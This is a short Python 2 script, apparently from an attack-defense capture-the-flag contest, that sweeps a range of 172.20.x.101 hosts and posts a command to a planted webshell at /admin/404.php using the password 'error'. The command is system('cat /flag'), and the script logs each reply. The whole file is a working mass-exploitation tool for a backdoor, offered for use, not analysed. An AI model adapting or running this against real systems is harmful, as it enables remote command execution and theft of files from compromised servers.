#  -*- coding: utf-8 -*-

import requests
import time


#http://172.24.4.28/layouts/libraries/20161022-3.php

'''
01后门获取flag4ok.py
http://172.20.115.101/admin/404.php
error
'''

ip1="172.24.4."
url1=""
shell="/admin/404.php"
passwd="error"
port="80"
payload={passwd:"system('cat /flag');"}

#f=open("webshelllist.txt","w")
#f1=open("firstroud_flag.txt","w")

filename=time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time()))

#filename=time.strftime('%Y-%m-%d-%H',time.localtime(time.time()))

filelog=open('./data/'+filename+'.txt', "wb")

for j in range(101,131):
    ip1='172.20.'
    for i in [101]:
        ip=ip1+str(j)+'.'+str(i)
        url1='http://'+ip+':'+port+shell
        print 'url1='+url1

        try:
            res=requests.post(url1,payload,timeout=1)
            #if res.status_code==200:
            #if '404' not in res.text:
            if 1:
                result=ip+' '+url1+'   '+res.text
                result1=ip+' '+'   '+res.text
                #print result
                print result1.replace("<br>",'')
                #filelog.write(result+'\r\n')
                filelog.write(result1)
        except:
            print
            print "ip: "+ip+" url1: "+url1+"  Error!"

filelog.close()

#f.close()
#f1.close()










